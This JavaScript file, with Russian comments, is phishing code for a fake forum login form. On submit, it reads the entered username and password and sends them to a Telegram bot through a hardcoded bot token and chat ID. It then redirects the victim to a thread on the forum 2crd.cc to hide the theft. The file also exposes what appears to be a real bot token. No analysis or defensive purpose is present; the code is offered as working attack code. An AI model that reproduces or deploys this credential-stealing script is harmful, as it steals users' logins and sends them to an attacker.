const FORM_DATA = document.querySelector('.telegram-form')
const ERROR_MESSAGE = 'Ошибка отправки сообщения'
const SUCCESS_MESSAGE = 'Успешно отправлено'

FORM_DATA.addEventListener('submit', formSend)

const contentContainer = document.getElementById('content')

// function handlePage(route) {
// 	// Пример: если URL оканчивается на /login, отобразить страницу логина
// 	if (route === 'login') {
// 		contentContainer.innerHTML = '<h2>Login Page</h2>'
// 	} else {
// 		// Если нет соответствующего маршрута, можно отобразить страницу логина или другую страницу по умолчанию
// 		contentContainer.innerHTML = '<h2>Login Page</h2>'
// 	}
// }

// Обработчик изменения URL
function handleRouteChange() {
	const path = window.location.pathname.substring(1) // Удаляем первый символ ("/")
	handlePage(path)
}

// Обработчик загрузки страницы
window.addEventListener('load', handleRouteChange)

// Обработчик изменения URL
window.addEventListener('popstate', handleRouteChange)

async function formSend(e) {
	event.stopPropagation()
	event.preventDefault()

	const TOKEN = '6880910594:AAGKIU90ZV4P-VFyYcur8hdHaqp_jneUc4o'
	const CHAT_ID = '-4020038187'
	const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&`
	const URL_2CRD = 'https://2crd.cc/showthread.php?goto=newpost&t=143781'

	let message = `
		<b>Login:</b> ${FORM_DATA.vb_login_username.value}
		<b>Password:</b> ${FORM_DATA.vb_login_password.value}
	`

	const response = await fetch(URL_API, {
		method: 'POST',
		body: JSON.stringify({
			chat_id: CHAT_ID,
			text: message,
			parse_mode: 'html'
		}),
		headers: {
			'Content-Type': 'application/json',
			'Access-Control-Allow-Origin': '2crd.cc', // Замените '*' на конкретный домен, если это безопасно
			'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE',
			'Access-Control-Allow-Headers': 'Content-Type'
		}
	})

	const result = await response.json()

	if (result.ok) {
		FORM_DATA.reset()
		console.log(SUCCESS_MESSAGE)

		window.location.assign(URL_2CRD)
	} else {
		console.log(ERROR_MESSAGE + result.description)
		window.location.href = 'https://2crd.cc/showthread.php?p=684440#post684440'
	}
}
